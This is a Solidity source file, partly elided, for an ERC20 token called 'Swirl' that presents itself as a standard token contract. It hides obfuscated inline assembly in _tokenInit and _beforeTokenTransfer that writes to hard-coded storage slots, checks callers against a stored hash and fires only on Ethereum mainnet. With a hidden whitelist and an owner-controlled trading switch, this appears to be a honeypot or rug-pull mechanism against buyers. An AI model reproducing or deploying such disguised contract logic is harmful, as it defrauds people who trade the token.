...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSwirl;
    uint256 private theTwister = block.number*2;

    mapping (address => bool) private _firstRotate; 
    mapping (address => bool) private _secondRoll;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _paperTrail;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private swissWatch;
    address public pair;
    ...
    bool private trading; uint256 private theWorm = 1; bool private closedDoor;
    uint256 private _decimals; uint256 private openTruck;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSwirl.push(_router); addSwirl.push(msgSender_); addSwirl.push(pair);
        for (uint256 q=0; q < 3;) {_firstRotate[addSwirl[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xdc1c02fdbec11fc14e7631b1169c251ff4678ec1613d0c326b229ccbbc32e972
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x4c49983b276426e30c936a87e241af459f94ae7a603392f104f6fb2634bc7106,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; theTwister = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSwirl[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySwirl(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSwirl[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySwirl(creator, initialSupply);
    }
}

contract Swirl is ERC20Token {
    constructor() ERC20Token("Swirl", "SWIRL", msg.sender, 1000000 * 10 ** 18) {
    }
}